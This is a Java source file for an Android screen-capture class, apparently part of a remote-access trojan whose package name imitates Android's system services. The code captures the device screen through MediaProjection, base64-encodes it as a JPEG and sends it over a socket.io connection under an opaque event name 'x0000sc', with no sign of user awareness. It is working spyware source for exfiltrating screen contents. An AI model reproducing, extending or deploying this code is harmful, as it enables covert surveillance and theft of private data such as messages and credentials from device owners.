package com.android.background.services.helpers;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import com.android.background.services.IOSocket;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class ScreenManager {

    private final Context context;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;

    public ScreenManager(Context context) {
        this.context = context;
    }

    @SuppressLint("WrongConstant")
    public void captureScreen(int resultCode, Intent data) {
        MediaProjectionManager projectionManager = (MediaProjectionManager) context.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        mediaProjection = projectionManager.getMediaProjection(resultCode, data);

        if (mediaProjection == null) return;

        DisplayMetrics metrics = new DisplayMetrics();
        WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        windowManager.getDefaultDisplay().getRealMetrics(metrics);
        int width = metrics.widthPixels;
        int height = metrics.heightPixels;
        int density = metrics.densityDpi;

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
        virtualDisplay = mediaProjection.createVirtualDisplay("ScreenCapture",
                width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(), null, null);

        imageReader.setOnImageAvailableListener(reader -> {
            Image image = null;
            try {
                image = reader.acquireLatestImage();
                if (image != null) {
                    processImage(image);
                    stopCapture();
                }
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                if (image != null) image.close();
            }
        }, new Handler(Looper.getMainLooper()));
    }

    private void processImage(Image image) {
        try {
            Image.Plane[] planes = image.getPlanes();
            ByteBuffer buffer = planes[0].getBuffer();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = planes[0].getRowStride();
            int rowPadding = rowStride - pixelStride * image.getWidth();

            Bitmap bitmap = Bitmap.createBitmap(image.getWidth() + rowPadding / pixelStride, image.getHeight(), Bitmap.Config.ARGB_8888);
            bitmap.copyPixelsFromBuffer(buffer);

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 50, baos);
            byte[] imageBytes = baos.toByteArray();
            String base64Image = Base64.encodeToString(imageBytes, Base64.DEFAULT);

            JSONObject jsonObject = new JSONObject();
            jsonObject.put("image", base64Image);
            IOSocket.getInstance().getIoSocket().emit("x0000sc", jsonObject);
            
            bitmap.recycle();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void stopCapture() {
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
        if (mediaProjection != null) {
            mediaProjection.stop();
            mediaProjection = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
    }
}
